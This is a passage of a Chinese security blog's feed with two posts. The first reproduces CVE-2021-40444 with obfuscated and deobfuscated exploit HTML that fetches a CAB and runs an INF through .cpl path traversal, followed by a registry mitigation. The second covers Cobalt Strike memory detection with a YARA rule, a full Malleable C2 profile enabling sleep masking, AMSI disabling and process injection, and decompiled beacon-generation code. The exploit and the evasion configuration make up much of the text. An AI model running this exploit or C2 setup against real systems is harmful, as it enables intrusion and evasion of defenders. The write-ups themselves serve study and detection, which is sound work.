_0x2ee207(0xe0) + &#39;a/Lo&#39; + &#39;ca&#39; + _0x2ee207(0xc7) + &#39;em&#39; + &#39;p/championship.inf&#39;,                _0xafc795[_0x2ee207(0xb3)][_0x2ee207(0xb0)] = &#39;.&#39; + _0xd7e33d + _0x371a71 + _0x487bfa + &#39;:&#39; + &#39;..&#39; + _0x2ee207(0xd6) + &#39;/.&#39; + &#39;./../A&#39; + _0x2ee207(0xdf) + _0x2ee207(0xe7) + &#39;Lo&#39; + _0x2ee207(0xc8) + &#39;T&#39; + _0x2ee207(0xb7) + _0x2ee207(0xdc) + &#39;w/championship.inf&#39;,                _0x5a6d4b[_0x2ee207(0xb3)][_0x2ee207(0xb0)] = &#39;.&#39; + _0xd7e33d + _0x371a71 + _0x487bfa + &#39;:.&#39; + &#39;./&#39; + _0x2ee207(0xe9) + &#39;..&#39; + &#39;/.&#39; + _0x2ee207(0xe6) + &#39;pp&#39; + &#39;Dat&#39; + _0x2ee207(0xb2) + &#39;ca&#39; + &#39;l/T&#39; + &#39;em&#39; + _0x2ee207(0xc3),                _0x258443[_0x2ee207(0xb3)][&#39;location&#39;] = &#39;.&#39; + _0xd7e33d + _0x371a71 + _0x487bfa + &#39;:&#39; + &#39;..&#39; + _0x2ee207(0xd6) + &#39;/.&#39; + _0x2ee207(0xdd) + &#39;T&#39; + _0x2ee207(0xb7) + _0x2ee207(0xdc) + _0x2ee207(0xcb),                _0x5a6d4b[&#39;Script&#39;][_0x2ee207(0xb0)] = &#39;.&#39; + _0xd7e33d + _0x371a71 + _0x487bfa + &#39;:.&#39; + &#39;./&#39; + &#39;../&#39; + &#39;..&#39; + &#39;/.&#39; + &#39;./../T&#39; + &#39;em&#39; + &#39;p/championship.inf&#39;,                _0x5a6d4b[_0x2ee207(0xb3)][&#39;location&#39;] = &#39;.&#39; + _0xd7e33d + _0x371a71 + _0x487bfa + &#39;:&#39; + _0x2ee207(0xe9) + _0x2ee207(0xe9) + _0x2ee207(0xbf),                _0x5a6d4b[_0x2ee207(0xb3)][&#39;location&#39;] = &#39;.&#39; + _0xd7e33d + _0x371a71 + _0x487bfa + &#39;:&#39; + &#39;../&#39; + _0x2ee207(0xe9) + _0x2ee207(0xd0);                &lt;!-- 重复垃圾代码分割线2 --&gt;            }());        &lt;/script&gt;    &lt;/body&gt;&lt;/html&gt;</code></pre><p>公开POC里的deob.html为作者解密混淆后写的</p><pre><code class="javascrript">&lt;!DOCTYPE html&gt;&lt;html&gt;    &lt;head&gt;        &lt;meta http-equiv=&quot;Expires&quot; content=&quot;-1&quot;&gt;        &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=11&quot;&gt;    &lt;/head&gt;    &lt;body&gt;        &lt;script&gt;            function garbage() {                return &#39;garbage&#39;;            }            (function exploit() {                var iframe = window[&quot;Document&quot;][&#39;prototype&#39;][&#39;createElement&#39;][&#39;call&#39;](window[&quot;document&quot;], &#39;iframe&#39;); //创建一个iframe标签的object                try {                    window[&quot;HTMLElement&quot;][&quot;prototype&quot;][&quot;appendChild&quot;][&#39;call&#39;](window[&quot;document&quot;][&#39;body&#39;], iframe); //当前body内容里添加iframe标签                } catch (_0x1ab454) {                    window[&quot;HTMLElement&quot;][&quot;prototype&quot;][&quot;appendChild&quot;][&#39;call&#39;](window[&quot;document&quot;][&#39;documentElement&#39;], iframe);                }                var htmlfile = iframe[&#39;contentWindow&#39;][&#39;ActiveXObject&#39;] //实例化ActiveXObject                  , htmlfile2 = new htmlfile(&#39;htmlfile&#39;); //htmlfile就是一个COM版的DOM，也就是说，htmlfile是个ActiveX版的 window.document                iframe[&#39;contentDocument&#39;][&#39;open&#39;]()[&#39;close&#39;](); //没有意义                try {                    window[&quot;HTMLElement&quot;][&quot;prototype&quot;][&quot;removeChild&quot;][&#39;call&#39;](window[&quot;document&quot;][&#39;body&#39;], iframe); //删除iframe标签                } catch (_0x3b004e) {                    window[&quot;HTMLElement&quot;][&quot;prototype&quot;][&quot;removeChild&quot;][&#39;call&#39;](window[&quot;document&quot;][&#39;documentElement&#39;], iframe);                }                htmlfile2[&#39;open&#39;]()[&#39;close&#39;](); //没有意义                var htmlfile3 = new htmlfile2[(&#39;Script&#39;)][&#39;ActiveXObject&#39;](&#39;htmlfile&#39;);                htmlfile3[&#39;open&#39;]()[&#39;close&#39;]();                var htmlfile4 = new htmlfile3[(&#39;Script&#39;)][&#39;ActiveXObject&#39;](&#39;htmlfile&#39;);                htmlfile4[&#39;open&#39;]()[&#39;close&#39;]();                var htmlfile5 = new htmlfile4[(&#39;Script&#39;)][&#39;ActiveXObject&#39;](&#39;htmlfile&#39;);                htmlfile5[&#39;open&#39;]()[&#39;close&#39;]();                var ActiveXObjectVAR = new ActiveXObject(&#39;htmlfile&#39;)                  , ActiveXObjectVAR2 = new ActiveXObject(&#39;htmlfile&#39;)                  , ActiveXObjectVAR3 = new ActiveXObject(&#39;htmlfile&#39;)                  , ActiveXObjectVAR4 = new ActiveXObject(&#39;htmlfile&#39;)                  , ActiveXObjectVAR5 = new ActiveXObject(&#39;htmlfile&#39;)                  , ActiveXObjectVAR6 = new ActiveXObject(&#39;htmlfile&#39;)                  , XMLHttpR = new window[&#39;XMLHttpRequest&#39;]()                  , XMLHttpRopen = window[&#39;XMLHttpRequest&#39;][&#39;prototype&#39;][&#39;open&#39;]                  , XMLHttpRsend = window[&#39;XMLHttpRequest&#39;][&#39;prototype&#39;][&#39;send&#39;];                XMLHttpRopen[&#39;call&#39;](XMLHttpR, &#39;GET&#39;, &#39;http://127.0.0.1/test.cab&#39;, ![]), //构造请求远程端的test.cab链接                XMLHttpRsend[&#39;call&#39;](XMLHttpR), //发送请求                htmlfile5[&#39;Script&#39;][&#39;document&#39;][&#39;write&#39;](&#39;body&gt;&#39;);                var htmlScript = window[&quot;Document&quot;][&#39;prototype&#39;][&#39;createElement&#39;][&#39;call&#39;](htmlfile5[&#39;Script&#39;][&#39;document&#39;], &#39;object&#39;); //创建Scriptobject                //下面这两步将会让IE自动请求远程的cab然后自动解压                htmlScript[&#39;setAttribute&#39;](&#39;codebase&#39;, &#39;http://127.0.0.1/test.cab#version=5,0,0,0&#39;); //设定codebase属性值                htmlScript[&#39;setAttribute&#39;](&#39;CLSID:edbc374c-5730-432a-b5b8-de94f0b57217&#39;), //设置CLSID                window[&quot;HTMLElement&quot;][&quot;prototype&quot;][&quot;appendChild&quot;][&#39;call&#39;](htmlfile5[&#39;Script&#39;][&#39;document&#39;][&#39;body&#39;], htmlScript), //将scriptobject添加到body                //逐个尝试用cpl从对应的路径中执行championship.inf文件（盲猜路径执行，总有一个能成）                ActiveXObjectVAR[&#39;Script&#39;][&#39;location&#39;] = &#39;.cpl:123&#39;,                ActiveXObjectVAR[&#39;Script&#39;][&#39;location&#39;] = &#39;.cpl:123&#39;,                ActiveXObjectVAR[&#39;Script&#39;][&#39;location&#39;] = &#39;.cpl:123&#39;,                ActiveXObjectVAR[&#39;Script&#39;][&#39;location&#39;] = &#39;.cpl:123&#39;,                ActiveXObjectVAR[&#39;Script&#39;][&#39;location&#39;] = &#39;.cpl:123&#39;,                ActiveXObjectVAR[&#39;Script&#39;][&#39;location&#39;] = &#39;.cpl:123&#39;,                ActiveXObjectVAR[&#39;Script&#39;][&#39;location&#39;] = &#39;.cpl:123&#39;,                ActiveXObjectVAR[&#39;Script&#39;][&#39;location&#39;] = &#39;.cpl:123&#39;,                ActiveXObjectVAR[&#39;Script&#39;][&#39;location&#39;] = &#39;.cpl:123&#39;,                ActiveXObjectVAR[&#39;Script&#39;][&#39;location&#39;] = &#39;.cpl:../../../AppData/Local/Temp/Low/championship.inf&#39;,                ActiveXObjectVAR2[&#39;Script&#39;][&#39;location&#39;] = &#39;.cpl:../../../AppData/Local/Temp/championship.inf&#39;,                ActiveXObjectVAR3[&#39;Script&#39;][&#39;location&#39;] = &#39;.cpl:../../../../AppData/Local/Temp/Low/championship.inf&#39;,                ActiveXObjectVAR4[&#39;Script&#39;][&#39;location&#39;] = &#39;.cpl:../../../../AppData/Local/Temp/championship.inf&#39;,                ActiveXObjectVAR5[&#39;Script&#39;][&#39;location&#39;] = &#39;.cpl:../../../../../Temp/Low/championship.inf&#39;,                ActiveXObjectVAR4[&#39;Script&#39;][&#39;location&#39;] = &#39;.cpl:../../../../../Temp/championship.inf&#39;,                ActiveXObjectVAR4[&#39;Script&#39;][&#39;location&#39;] = &#39;.cpl:../../Low/championship.inf&#39;,                ActiveXObjectVAR4[&#39;Script&#39;][&#39;location&#39;] = &#39;.cpl:../../championship.inf&#39;; //设置cpl执行championship.inf            }());        &lt;/script&gt;    &lt;/body&gt;&lt;/html&gt;</code></pre><p>调用XMLHttpRequest请求cab文件后 ,将自动解压到Temp目录，最后用cpl执行<br><img src="https://z3.ax1x.com/2021/09/13/4P2Ya6.png" alt=""><br><img src="https://z3.ax1x.com/2021/09/13/4P2dRe.png" alt=""><br><img src="https://z3.ax1x.com/2021/09/13/4P2wxH.png" alt=""><br><img src="https://z3.ax1x.com/2021/09/13/4P26dP.png" alt=""></p><p>参考链接:<a href="https://www.cnblogs.com/qguohog/archive/2013/01/25/2876828.html" target="_blank" rel="noopener">https://www.cnblogs.com/qguohog/archive/2013/01/25/2876828.html</a></p><p>动态执行分析如下：<br>-&gt;远程请求发起<br>-&gt;mshtml.dll解析js里的内容<br>-&gt;然后下载cab文件<br>-&gt;从IE的TEMP目录找到临时的cab文件解压到C:\Users\<username>\AppData\Local\Temp<br>-&gt;最后control.exe将调用inf<br><img src="https://z3.ax1x.com/2021/09/13/4P2vQJ.png" alt=""><br><img src="https://z3.ax1x.com/2021/09/13/4PR9dx.png" alt=""><br><img src="https://z3.ax1x.com/2021/09/13/4PR1fS.png" alt=""></username></p><p>复现GIF<br><img src="https://z3.ax1x.com/2021/09/13/4PRGlQ.gif" alt=""></p><p>修复方案：<br>这会将 64 位和 32 位进程的所有 Internet 区域的 URLACTION_DOWNLOAD_SIGNED_ACTIVEX (0x1001) 和 URLACTION_DOWNLOAD_UNSIGNED_ACTIVEX (0x1004) 设置为 DISABLED (3)。不会安装新的 ActiveX 控件。以前安装的 ActiveX 控件将继续运行。</p><p>如何撤消解决方法<br>将策略中的选项设置为Enable。<br>要通过 regkey 在单个系统上禁用 ActiveX 控件：<br>警告如果注册表编辑器使用不当，可能会导致严重的问题，可能需要重新安装操作系统。Microsoft 不能保证您可以解决因注册表编辑器使用不当而导致的问题。使用注册表编辑器风险自负。</p><p>要禁止在 Internet Explorer 中的所有区域安装 ActiveX 控件，请将以下内容粘贴到文本文件中并使用 .reg 文件扩展名保存：</p><pre><code>Windows Registry Editor Version 5.00[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0]&quot;1001&quot;=dword:00000003&quot;1004&quot;=dword:00000003[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\1]&quot;1001&quot;=dword:00000003&quot;1004&quot;=dword:00000003[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\2]&quot;1001&quot;=dword:00000003&quot;1004&quot;=dword:00000003[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\3]&quot;1001&quot;=dword:00000003&quot;1004&quot;=dword:00000003</code></pre><p><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-40444" target="_blank" rel="noopener">https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-40444</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;测试环境&quot;&gt;&lt;a href=&quot;#测试环境&quot; class=&quot;headerlink&quot; title=&quot;测试环境&quot;&gt;&lt;/a&gt;测试环境&lt;/h2&gt;&lt;p&gt;office 2016&lt;br&gt;windows 10 ver:1909&lt;/p&gt;
&lt;h2 id=&quot;漏洞成因&quot;&gt;&lt;a href=&quot;</summary>
      
    
    
    
    
    <category term="漏洞复现" scheme="http://422926799.github.io/tags/漏洞复现/"/>
    
  </entry>
  
  <entry>
    <title>关于这几天cs进程里的特征和网上的一些bypass</title>
    <link href="http://422926799.github.io/posts/40a5ffce.html"/>
    <id>http://422926799.github.io/posts/40a5ffce.html</id>
    <published>2021-09-11T09:53:15.000Z</published>
    <updated>2021-09-11T10:08:32.260Z</updated>
    
    <content type="html"><![CDATA[<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://adamsvoboda.net/sleeping-with-a-mask-on-cobaltstrike/" target="_blank" rel="noopener">https://adamsvoboda.net/sleeping-with-a-mask-on-cobaltstrike/</a><br><a href="https://mp.weixin.qq.com/s/mh8iYU6lQohsVrINM2uvCg" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/mh8iYU6lQohsVrINM2uvCg</a><br><a href="https://www.arashparsa.com/hook-heaps-and-live-free/" target="_blank" rel="noopener">https://www.arashparsa.com/hook-heaps-and-live-free/</a></p><h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><p>首先cs上线进程注入个进程<br><img src="https://z3.ax1x.com/2021/09/11/hzyILF.png" alt=""></p><p>使用ProcessHacker定位到SleepEx函数<br><img src="https://z3.ax1x.com/2021/09/11/hzy7dJ.png" alt=""></p><p>转到内存保存可以看到明显的MZ头<br><img src="https://z3.ax1x.com/2021/09/11/hzyxsO.png" alt=""><br><img src="https://z3.ax1x.com/2021/09/11/hz6Zy8.png" alt=""></p><p>利用给出的yara规则进行进程检测，可以很明显的发现是cs的进程<br><a href="https://github.com/jas502n/cs_yara" target="_blank" rel="noopener">https://github.com/jas502n/cs_yara</a><br>遍历进程寻找cs的进程：powershell -command “Get-Process | ForEach-Object {./yara64.exe beaconEye.yar $_.ID -s}”<br><img src="https://z3.ax1x.com/2021/09/11/hz6rSx.png" alt=""></p><pre><code>rule CobaltStrike {  strings:      $cobaltStrikeRule64 = {  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  01 00 00 00 00 00 00 00 (00|01|02|04|08|10) 00 00 00 00 00 00 00  01 00 00 00 00 00 00 00 ?? ?? 00 00 00 00 00 00  02 00 00 00 00 00 00 00 ?? ?? ?? ?? 00 00 00 00  02 00 00 00 00 00 00 00 ?? ?? ?? ?? 00 00 00 00  01 00 00 00 00 00 00 00 ?? ?? 00 00 00 00 00 00 }    $cobaltStrikeRule32 = {  00 00 00 00 00 00 00 00  01 00 00 00 (00|01|02|04|08|10) 00 00 00 01 00 00 00 ?? ?? 00 00  02 00 00 00 ?? ?? ?? ??  02 00 00 00 ?? ?? ?? ??  01 00 00 00 ?? ?? 00 00 }  condition: any of them}</code></pre><p>cs的c2profile的sleep_mask是sleep xor加密的算法是否开启<br><img src="https://z3.ax1x.com/2021/09/11/hz64fI.png" alt=""></p><p>sleep.profile</p><pre><code>#This profile is meant to show all of the options available in Malleable C2#Various options# Append random-length string (up to data_jitter value) to http-get and http-post server outputset sample_name &quot;Test Profile&quot;;set dns_idle &quot;0.0.0.0&quot;;set dns_max_txt &quot;252&quot;;set dns_sleep &quot;0&quot;;set dns_stager_prepend &quot;&quot;;set dns_stager_subhost &quot;.stage.123456.&quot;;set dns_ttl &quot;1&quot;;set host_stage &quot;true&quot;; #Host payload for staging over set, setS, or DNS. Required by stagers.set jitter &quot;0&quot;;set maxdns &quot;255&quot;;set pipename &quot;msagent_###&quot;; #Default name of pipe to use for SMB Beacon’s peer-to-peer communication. Each # is replaced witha random hex value.set pipename_stager &quot;status_##&quot;;set sleeptime &quot;60000&quot;; #def sleep in msset smb_frame_header &quot;&quot;;set ssh_banner &quot;Cobalt Strike 4.2&quot;;set tcp_frame_header &quot;&quot;;set tcp_port &quot;4444&quot;;# Defaults for ALL CS set server responseshttp-config {    set headers &quot;Date, Server, Content-Length, Keep-Alive, Connection, Content-Type&quot;;    header &quot;Server&quot; &quot;Apache&quot;;    header &quot;Keep-Alive&quot;&quot;timeout=5, max=100&quot;;    header &quot;Connection&quot;&quot;Keep-Alive&quot;;#   The set trust_x_forwarded_foroption decides if Cobalt Strike uses the# X-Forwarded-For set header to determine the remote address of a request.# Use this option if your Cobalt Strike server is behind an set redirector        set trust_x_forwarded_for &quot;true&quot;;}https-certificate {    set C &quot;US&quot;; #Country    set CN &quot;localhost&quot;; # CN - you will probably nver use this, but don&#39;t leave at localost    set L &quot;San Francisco&quot;; #Locality    set OU &quot;IT Services&quot;; #Org unit    set O &quot;FooCorp&quot;; #Org name    set ST &quot;CA&quot;; #State    set validity &quot;365&quot;;    # if using a valid vert, specify this, keystore = java keystore    #set keystore &quot;domain.store&quot;;    #set password &quot;mypassword&quot;;}#If you have code signing cert:#code-signer {#    set keystore &quot;keystore.jks&quot;;#    set password &quot;password&quot;;#    set alias    &quot;server&quot;;#    set timestamp &quot;false&quot;;#    set timestamp_url &quot;set://timestamp.digicert.com&quot;;#}#Stager is only supported as a GET request and it will use AFAICT the IE on Windows.http-stager {    set uri_x86 &quot;/api/v1/GetLicence&quot;;         set uri_x64 &quot;/api/v2/GetLicence&quot;;    client {        parameter &quot;uuid&quot; &quot;96c5f1e1-067b-492e-a38b-4f6290369121&quot;;        #header &quot;headername&quot; &quot;headervalue&quot;;    }    server {        header &quot;Content-Type&quot; &quot;application/octet-stream&quot;;            header &quot;Content-Encoding&quot; &quot;gzip&quot;;            output {                    #GZIP headers and footers            prepend &quot;\x1F\x8B\x08\x08\xF0\x70\xA3\x50\x00\x03&quot;;            append &quot;\x7F\x01\xDD\xAF\x58\x52\x07\x00&quot;;            #AFAICT print is the only supported terminator            print;        }    }}#This is used only in http-get and http-post and not during stageset useragent &quot;Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko&quot;;# define indicators for an set GEThttp-get {    # we require a stub URI to attach the rest of our data to.    set uri &quot;/api/v1/Updates&quot;;    client {        header &quot;Accept-Encoding&quot; &quot;deflate, gzip;q=1.0, *;q=0.5&quot;;        # mask our metadata, base64 encode it, store it in the URI        metadata {            # XOR encode the value            mask;            # URL-safe Base64 Encode            #base64url;            # URL-safe Base64 Encode            base64;            # NetBIOS Encode ‘a’ ?            #netbios;            #NetBIOS Encode ‘A’            #netbiosu;            # You probably want these to be last two, else you will encode these values            # Append a string to metadata            append &quot;;&quot; ;            # Prepend a string            prepend &quot;SESSION=&quot;;            # Terminator statements - these say where the metadata goes            # Pick one            # Append to URI            #uri-append;            #Set in a header            header &quot;Cookie&quot;;            #Send data as transaction body            #print            #Store data in a URI parameter            #parameter &quot;someparam&quot;        }    }    server {        header &quot;Content-Type&quot; &quot;application/octet-stream&quot;;        header &quot;Content-Encoding&quot; &quot;gzip&quot;;        # prepend some text in case the GET is empty.        output {            mask;            base64;            prepend &quot;\x1F\x8B\x08\x08\xF0\x70\xA3\x50\x00\x03&quot;;            append &quot;\x7F\x01\xDD\xAF\x58\x52\x07\x00&quot;;                        print;        }    }}# define indicators for an set POSThttp-post {    set uri &quot;/api/v1/Telemetry/Id/&quot;;    set verb &quot;POST&quot;;    client {        # make it look like we&#39;re posting something cool.        header &quot;Content-Type&quot; &quot;application/json&quot;;        header &quot;Accept-Encoding&quot; &quot;deflate, gzip;q=1.0, *;q=0.5&quot;;        # ugh, our data has to go somewhere!        output {            mask;            base64url;            uri-append;        }        # randomize and post our session ID        id {            mask;            base64url;            prepend &quot;{version: 1, d=\x22&quot;;                        append &quot;\x22}\n&quot;;            print;        }    }    # The server&#39;s response to our set POST    server {        header &quot;Content-Type&quot; &quot;application/octet-stream&quot;;        header &quot;Content-Encoding&quot; &quot;gzip&quot;;        # post usually sends nothing, so let&#39;s prepend a string, mask it, and        # base64 encode it. We&#39;ll get something different back each time.        output {            mask;            base64;            prepend &quot;\x1F\x8B\x08\x08\xF0\x70\xA3\x50\x00\x03&quot;;            append &quot;\x7F\x01\xDD\xAF\x58\x52\x07\x00&quot;;                        print;        }    }}stage {#    The transform-x86 and transform-x64 blocks pad and transform Beacon’s# Reflective DLL stage. These blocks support three commands: prepend, append, and strrep.    transform-x86 {        prepend &quot;\x90\x90&quot;;        strrep &quot;ReflectiveLoader&quot; &quot;DoLegitStuff&quot;;    }    transform-x64 {        # transform the x64 rDLL stage, same options as with    }    stringw &quot;I am not Beacon&quot;;    set cleanup &quot;true&quot;;        # Ask Beacon to attempt to free memory associated with                                # the Reflective DLL package that initialized it.    # Override the first bytes (MZ header included) of Beacon&#39;s Reflective DLL.    # Valid x86 instructions are required. Follow instructions that change    # CPU state with instructions that undo the change.#    set magic_mz_x86 &quot;MZRE&quot;;#    set magic_mz_x86 &quot;MZAR&quot;;    # Ask the x86 ReflectiveLoader to load the specified library and overwrite    #  its space instead of allocating memory with VirtualAlloc.    # Only works with VirtualAlloc    #set module_x86 &quot;xpsservices.dll&quot;;    #set module_x64 &quot;xpsservices.dll&quot;;    # Obfuscate the Reflective DLL’s import table, overwrite unused header content,    # and ask ReflectiveLoader to copy Beacon to new memory without its DLL headers.    set obfuscate &quot;false&quot;;    # Obfuscate Beacon, in-memory, prior to sleeping    set sleep_mask &quot;true&quot;;    # Use embedded function pointer hints to bootstrap Beacon agent without    # walking kernel32 EAT    set smartinject &quot;true&quot;;    # Ask ReflectiveLoader to stomp MZ, PE, and e_lfanew values after    # it loads Beacon payload    set stomppe &quot;true&quot;;    # Ask ReflectiveLoader to use (true) or avoid RWX permissions (false) for Beacon DLL in memory    set userwx &quot;false&quot;;#    set image_size_x86 &quot;512000&quot;;#    set image_size_x64 &quot;512000&quot;;    set entry_point &quot;92145&quot;;    #The Exported name of the Beacon DLL    #set name &quot;beacon.x64.dll&quot;    #set rich_header  # I don&#39;t understand this yet TODO: fixme    #TODO: add examples process-inject}process-inject {        # set how memory is allocated in a remote process        # VirtualAllocEx or NtMapViewOfSection. The        # NtMapViewOfSection option is for same-architecture injection only.        # VirtualAllocEx is always used for cross-arch memory allocations.        set allocator &quot;VirtualAllocEx&quot;;        # shape the memory characteristics and content        set min_alloc &quot;16384&quot;;        set startrwx &quot;true&quot;;        set userwx &quot;false&quot;;        transform-x86 {        prepend &quot;\x90\x90&quot;;        }        transform-x64 {        # transform x64 injected content        }        # determine how to execute the injected code        execute {            CreateThread &quot;ntdll.dll!RtlUserThreadStart&quot;;            SetThreadContext;            RtlCreateUserThread;        }}post-ex {    # control the temporary process we spawn to    set spawnto_x86 &quot;%windir%\\syswow64\\WerFault.exe&quot;;    set spawnto_x64 &quot;%windir%\\sysnative\\WerFault.exe&quot;;    # change the permissions and content of our post-ex DLLs    set obfuscate &quot;true&quot;;    # pass key function pointers from Beacon to its child jobs    set smartinject &quot;true&quot;;    # disable AMSI in powerpick, execute-assembly, and psinject    set amsi_disable &quot;true&quot;;    #The thread_hint option allows multi-threaded post-ex DLLs to spawn    # threads with a spoofed start address. Specify the thread hint as    # “module!function+0x##” to specify the start address to spoof.    # The optional 0x## part is an offset added to the start address.    # set thread_hint &quot;....TODO:FIXME&quot;}</code></pre><p>根据wx公众号的文章结尾所描述<br><img src="https://z3.ax1x.com/2021/09/11/hz6zpq.png" alt=""></p><p>经过测试确实如此<br><img src="https://z3.ax1x.com/2021/09/11/hzc9XT.png" alt=""></p><p>processhacker Memory所定位看到的内存是xor过的，MZ头也没了<br><img src="https://z3.ax1x.com/2021/09/11/hzcEN9.png" alt=""><br><img src="https://z3.ax1x.com/2021/09/11/hzcm1x.png" alt=""></p><p>还是能检测出来<br><img src="https://z3.ax1x.com/2021/09/11/hzcujK.png" alt=""></p><p>看到的文章中还有一篇是Hook SleepEx函数，然后进行修改 （由于个人过于垃圾无法复现该文章）<br><a href="https://www.arashparsa.com/hook-heaps-and-live-free/" target="_blank" rel="noopener">https://www.arashparsa.com/hook-heaps-and-live-free/</a></p><p>最后就是跟着公众号文章分析了一下cs beacon生成的过程 （详细分析请看wx公众号的文章</p><pre><code>BeaconConfig的生成在 BeaconPayload类的 exportBeaconStage函数中</code></pre><p><img src="https://z3.ax1x.com/2021/09/11/hzcY9I.png" alt=""></p><p>exportBeaconStage</p><pre><code>    protected byte[] exportBeaconStage(int paramInt, String paramString1, boolean paramBoolean1, boolean paramBoolean2, String paramString2)  {    try    {      long l1 = System.currentTimeMillis(); //返回当前世界时间(毫秒)      byte[] arrayOfByte1 = SleevedResource.readResource(paramString2); //读取对应的dll并解密数据      if (paramString1.length() &gt; 254) { //如果长度大于254则只读取0~254        paramString1 = paramString1.substring(0, 254);      }      String[] arrayOfString1 = this.c2profile.getString(&quot;.http-get.uri&quot;).split(&quot; &quot;); //get请求的路径读取      String[] arrayOfString2 = paramString1.split(&quot;,\\s*&quot;); //字符串分割      LinkedList localLinkedList = new LinkedList();      for (int i = 0; i &lt; arrayOfString2.length; i++) //遍历数据添加到localLinkedList      {        localLinkedList.add(arrayOfString2[i]);        localLinkedList.add(CommonUtils.pick(arrayOfString1));      }      while ((localLinkedList.size() &gt; 2) &amp;&amp; (CommonUtils.join(localLinkedList, &quot;,&quot;).length() &gt; 255))      {        str1 = localLinkedList.removeLast() + &quot;&quot;;        String str2 = localLinkedList.removeLast() + &quot;&quot;;        CommonUtils.print_info(&quot;dropping &quot; + str2 + str1 + &quot; from Beacon profile for size&quot;);      }      String str1 = randua(this.c2profile);      int j = Integer.parseInt(this.c2profile.getString(&quot;.sleeptime&quot;)); //c2profile延时时间读取      String str3 = CommonUtils.pick(this.c2profile.getString(&quot;.http-post.uri&quot;).split(&quot; &quot;)); //post请求的路径      byte[] arrayOfByte2 = this.c2profile.recover_binary(&quot;.http-get.server.output&quot;);//server头返回      byte[] arrayOfByte3 = this.c2profile.apply_binary(&quot;.http-get.client&quot;);//client请求      byte[] arrayOfByte4 = this.c2profile.apply_binary(&quot;.http-post.client&quot;);//post client请求      int k = this.c2profile.size(&quot;.http-get.server.output&quot;, 1048576); //get请求返回      int m = Integer.parseInt(this.c2profile.getString(&quot;.jitter&quot;));      if ((m &lt; 0) || (m &gt; 99)) {        m = 0;      }      int n = Integer.parseInt(this.c2profile.getString(&quot;.maxdns&quot;));      if ((n &lt; 0) || (n &gt; 255)) {        n = 255;      }      int i1 = 0;      if (paramBoolean1) {        i1 |= 0x1;      }      if (paramBoolean2) {        i1 |= 0x8;      }      long l2 = CommonUtils.ipToLong(this.c2profile.getString(&quot;.dns_idle&quot;));      int i2 = Integer.parseInt(this.c2profile.getString(&quot;.dns_sleep&quot;)); //dns延迟读取      Settings localSettings = new Settings(); //beacon配置      localSettings.addShort(1, i1);      localSettings.addShort(2, paramInt);      localSettings.addInt(3, j);      localSettings.addInt(4, k);      localSettings.addShort(5, m);      localSettings.addShort(6, n);      localSettings.addData(7, this.publickey, 256);      localSettings.addString(8, CommonUtils.join(localLinkedList, &quot;,&quot;), 256);      localSettings.addString(9, str1, 128);      localSettings.addString(10, str3, 64);      localSettings.addData(11, arrayOfByte2, 256);      localSettings.addData(12, arrayOfByte3, 256);      localSettings.addData(13, arrayOfByte4, 256);      localSettings.addData(14, CommonUtils.asBinary(this.c2profile.getString(&quot;.spawnto&quot;)), 16);      localSettings.addString(29, this.c2profile.getString(&quot;.post-ex.spawnto_x86&quot;), 64);      localSettings.addString(30, this.c2profile.getString(&quot;.post-ex.spawnto_x64&quot;), 64);      localSettings.addString(15, &quot;&quot;, 128);      localSettings.addShort(31, QuickSecurity.getCryptoScheme());      localSettings.addInt(19, (int)l2);      localSettings.addInt(20, i2);      localSettings.addString(26, this.c2profile.getString(&quot;.http-get.verb&quot;), 16);      localSettings.addString(27, this.c2profile.getString(&quot;.http-post.verb&quot;), 16);      localSettings.addInt(28, this.c2profile.shouldChunkPosts() ? 96 : 0);      localSettings.addInt(37, this.c2profile.getInt(&quot;.watermark&quot;));      localSettings.addShort(38, this.c2profile.option(&quot;.stage.cleanup&quot;) ? 1 : 0);      localSettings.addShort(39, this.c2profile.exerciseCFGCaution() ? 1 : 0);      String str4 = this.listener.getHostHeader();      if ((str4 == null) || (str4.length() == 0)) {        localSettings.addString(54, &quot;&quot;, 128);      } else if (Profile.usesHostBeacon(this.c2profile)) {        localSettings.addString(54, &quot;&quot;, 128);      } else {        localSettings.addString(54, &quot;Host: &quot; + this.listener.getHostHeader() + &quot;\r\n&quot;, 128);      }      if (Profile.usesCookieBeacon(this.c2profile)) {        localSettings.addShort(50, 1);      } else {        localSettings.addShort(50, 0);      }      ProxyServer localProxyServer = ProxyServer.parse(this.listener.getProxyString()); //代理      localProxyServer.setup(localSettings);      setupPivotFrames(this.c2profile, localSettings);      setupKillDate(localSettings);      setupGargle(localSettings, paramString2);      new ProcessInject(this.c2profile).apply(localSettings);      byte[] arrayOfByte5 = localSettings.toPatch();      arrayOfByte5 = beacon_obfuscate(arrayOfByte5); //xor      String str5 = CommonUtils.bString(arrayOfByte1);      int i3 = str5.indexOf(&quot;AAAABBBBCCCCDDDDEEEEFFFF&quot;);      str5 = CommonUtils.replaceAt(str5, CommonUtils.bString(arrayOfByte5), i3);      return CommonUtils.toBytes(str5);    }    catch (IOException localIOException)    {      MudgeSanity.logException(&quot;export Beacon stage: &quot; + paramString2, localIOException, false);    }    return new byte[0];  }</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;参考链接&quot;&gt;&lt;a href=&quot;#参考链接&quot; class=&quot;headerlink&quot; title=&quot;参考链接&quot;&gt;&lt;/a&gt;参考链接&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://adamsvoboda.net/sleeping-with-a-mask-on-cobal</summary>
      
    
    
    
    
    <category term="红队" scheme="http://422926799.github.io/tags/红队/"/>
    
  </entry>
  
  <entry>
    <title>DLL转shellcode研究</title>
